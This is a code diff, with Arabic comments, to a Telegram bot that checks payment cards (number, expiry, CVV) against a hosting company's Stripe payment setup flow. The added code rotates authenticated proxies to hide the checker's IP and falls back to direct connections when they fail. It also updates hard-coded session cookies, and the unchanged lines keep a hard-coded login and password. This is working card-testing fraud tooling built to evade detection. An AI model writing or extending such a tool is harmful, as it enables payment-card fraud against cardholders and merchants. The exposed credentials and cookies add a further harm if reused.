@@ -21,20 +21,78 @@ USERNAME = "desertessence@desertessence.com"
 PASSWORD = "desertessence@desertessence.com"
 LOGIN_URL = "https://my.knownhost.com/client/login"
 AUTH_COOKIES_FILE = "auth_cookies.json"
+PROXY_FILE = "proxies.txt"
+
+# قائمة البروكسيات
+PROXY_LIST = []
+
+def load_proxies():
+    """تحميل البروكسيات من الملف"""
+    global PROXY_LIST
+    try:
+        if os.path.exists(PROXY_FILE):
+            with open(PROXY_FILE, 'r') as f:
+                proxies = []
+                for line in f:
+                    line = line.strip()
+                    if line and ':' in line:
+                        parts = line.split(':')
+                        if len(parts) == 4:
+                            ip, port, user, password = parts
+                            proxy_url = f"http://{user}:{password}@{ip}:{port}"
+                            proxies.append(proxy_url)
+                PROXY_LIST = proxies
+                print(f"[✓] تم تحميل {len(PROXY_LIST)} بروكسي")
+                return True
+        print("[!] ملف البروكسيات غير موجود")
+        return False
+    except Exception as e:
+        print(f"[!] خطأ في تحميل البروكسيات: {e}")
+        return False
+
+def test_proxy(proxy_url, timeout=10):
+    """اختبار البروكسي"""
+    try:
+        proxies = {
+            'http': proxy_url,
+            'https': proxy_url
+        }
+        response = requests.get('https://api.ipify.org?format=json', proxies=proxies, timeout=timeout)
+        if response.status_code == 200:
+            print(f"[✓] البروكسي يعمل: {response.json().get('ip')}")
+            return True
+    except:
+        pass
+    return False
+
+def get_working_proxy():
+    """الحصول على بروكسي يعمل"""
+    if not PROXY_LIST:
+        return None
+    
+    # اختيار 5 بروكسيات عشوائية للاختبار
+    import random
+    test_proxies = random.sample(PROXY_LIST, min(5, len(PROXY_LIST)))
+    
+    for proxy in test_proxies:
+        if test_proxy(proxy, timeout=5):
+            return proxy
+    
+    print("[!] لم يتم العثور على بروكسي يعمل")
+    return None
 
 # الـ Cookies الثابتة
 BASE_COOKIES = {
-    '_gcl_au': '1.1.706308518.1761481419',
-    '_fbp': 'fb.1.1761481419833.135555912565300990',
-    '_gid': 'GA1.2.1673967538.1761481423',
-    '__mmapiwsid': '019a2079-8de1-737b-aa8d-4933ed7a5644:a5eaa90acab09de640bf7ff708e4cc6f6989722b',
-    'blesta_sid': '16ra83trokms8080bfd2vbhur3',
-    '__stripe_mid': 'fc6955eb-8b99-4790-b131-753af86278f52141bc',
-    '_uetsid': '9c674670b26611f0af82698c8f6cbf35',
-    '_uetvid': '9c675cc0b26611f08d03256ba9e96f04',
-    '_ga': 'GA1.2.717734608.1761481419',
-    '_rdt_uuid': '1761481421517.06bcba0c-acf4-4823-85c2-324c918d2257',
-    '_ga_ME5XD3CP95': 'GS2.1.s1761481419$o1$g1$t1761483089$j56$l0$h0',
+    '_gcl_au': '1.1.1731755719.1761294273',
+    'PAPVisitorId': '7095f26325c875e9da4fdaa66171apP6',
+    '_fbp': 'fb.1.1761298965302.822697239648290722',
+    'lhc_per': 'vid|8994dfb5d60d3132fabe',
+    '__mmapiwsid': '0199d361-1f43-7b6b-9c97-250e8a6a95db:0664b174ef7b3925be07d4b964be6a38b1029da7',
+    '_gid': 'GA1.2.1609015390.1761435403',
+    '_rdt_uuid': '1761294274156.8dd9903d-c9cf-401b-885d-0dad4931526f',
+    '_uetsid': 'a2028140b1fa11f086cd03ee33166b9d',
+    '_uetvid': 'df284260b0b211f086cb537b4a717cc2',
+    '_ga': 'GA1.2.586933227.1761298965',
 }
 
 HEADERS = {
@@ -147,7 +205,18 @@ def generate_guid():
     return f"{generate_random_string(8)}-{generate_random_string(4)}-{generate_random_string(4)}-{generate_random_string(4)}-{generate_random_string(12)}"
 
 def create_fresh_session():
+    """إنشاء session جديدة مع بروكسي عشوائي"""
     session = requests.Session()
+    
+    # إضافة بروكسي عشوائي
+    if PROXY_LIST:
+        proxy = random.choice(PROXY_LIST)
+        session.proxies = {
+            'http': proxy,
+            'https': proxy
+        }
+        print(f"[🌐] استخدام بروكسي: {proxy.split('@')[1] if '@' in proxy else proxy[:20]}...")
+    
     session.cookies.update(BASE_COOKIES)
     
     muid = f"{generate_guid()}{generate_random_string(6)}"
@@ -197,26 +266,70 @@ async def check_card(card, bot_app):
     
     card_number, exp_month, exp_year, cvv = parts
     
-    session, muid, sid, guid, stripe_js_id = create_fresh_session()
-    csrf_token, setup_secret = get_payment_page(session)
-    
-    # إذا فشل Setup Secret، جرب تحديث الكوكيز
-    if not setup_secret:
-        print("[!] فشل Setup Secret، محاولة تحديث الكوكيز...")
-        if refresh_cookies_if_needed():
-            session.close()
+    # محاولة مع بروكسي، وإذا فشل جرب بدون بروكسي
+    max_retries = 2
+    for attempt in range(max_retries):
+        try:
             session, muid, sid, guid, stripe_js_id = create_fresh_session()
+            
+            # اختبار البروكسي أولاً
+            if session.proxies:
+                try:
+                    test_response = session.get('https://api.ipify.org?format=json', timeout=5)
+                    if test_response.status_code != 200:
+                        print(f"[!] البروكسي لا يعمل، محاولة {attempt + 1}/{max_retries}")
+                        session.close()
+                        if attempt < max_retries - 1:
+                            continue
+                        else:
+                            # استخدام بدون بروكسي
+                            session = requests.Session()
+                            session.cookies.update(BASE_COOKIES)
+                            print("[⚠️] الاستمرار بدون بروكسي")
+                except:
+                    print(f"[!] فشل اختبار البروكسي، محاولة {attempt + 1}/{max_retries}")
+                    session.close()
+                    if attempt < max_retries - 1:
+                        continue
+                    else:
+                        session = requests.Session()
+                        session.cookies.update(BASE_COOKIES)
+            
             csrf_token, setup_secret = get_payment_page(session)
-        
-        if not setup_secret:
-            stats['errors'] += 1
-            stats['error_details']['SETUP_ERROR'] = stats['error_details'].get('SETUP_ERROR', 0) + 1
-            stats['checking'] -= 1
-            stats['last_response'] = 'Setup Error'
-            await update_dashboard(bot_app)
-            session.close()
-            return card, "ERROR", "فشل Setup"
+            
+            # إذا فشل Setup Secret، جرب تحديث الكوكيز
+            if not setup_secret:
+                print("[!] فشل Setup Secret، محاولة تحديث الكوكيز...")
+                if refresh_cookies_if_needed():
+                    session.close()
+                    session, muid, sid, guid, stripe_js_id = create_fresh_session()
+                    csrf_token, setup_secret = get_payment_page(session)
+                
+                if not setup_secret:
+                    stats['errors'] += 1
+                    stats['error_details']['SETUP_ERROR'] = stats['error_details'].get('SETUP_ERROR', 0) + 1
+                    stats['checking'] -= 1
+                    stats['last_response'] = 'Setup Error'
+                    await update_dashboard(bot_app)
+                    session.close()
+                    return card, "ERROR", "فشل Setup"
+            
+            # باقي الكود كما هو...
+            break
+            
+        except Exception as e:
+            print(f"[!] خطأ في المحاولة {attempt + 1}: {str(e)[:50]}")
+            if attempt < max_retries - 1:
+                continue
+            else:
+                stats['errors'] += 1
+                stats['error_details']['CONNECTION_ERROR'] = stats['error_details'].get('CONNECTION_ERROR', 0) + 1
+                stats['checking'] -= 1
+                stats['last_response'] = 'Connection Error'
+                await update_dashboard(bot_app)
+                return card, "ERROR", "Connection Failed"
     
+    # استكمال عملية الفحص
     headers = {
         'accept': 'application/json',
         'content-type': 'application/x-www-form-urlencoded',
@@ -582,6 +695,20 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update_dashboard(context.application)
 
 def main():
+    # تحميل البروكسيات
+    print("🌐 جاري تحميل البروكسيات...")
+    if load_proxies():
+        print(f"[✓] تم تحميل {len(PROXY_LIST)} بروكسي")
+        # اختبار بروكسي واحد للتأكد
+        print("🔍 اختبار بروكسي عشوائي...")
+        test_proxy_url = get_working_proxy()
+        if test_proxy_url:
+            print("[✓] البروكسيات جاهزة للاستخدام!")
+        else:
+            print("[⚠️] تحذير: لم يتم العثور على بروكسي يعمل، سيتم المحاولة بدون بروكسي")
+    else:
+        print("[⚠️] سيتم العمل بدون بروكسيات")
+    
     app = Application.builder().token(BOT_TOKEN).build()
     
     app.add_handler(CommandHandler("start", start))
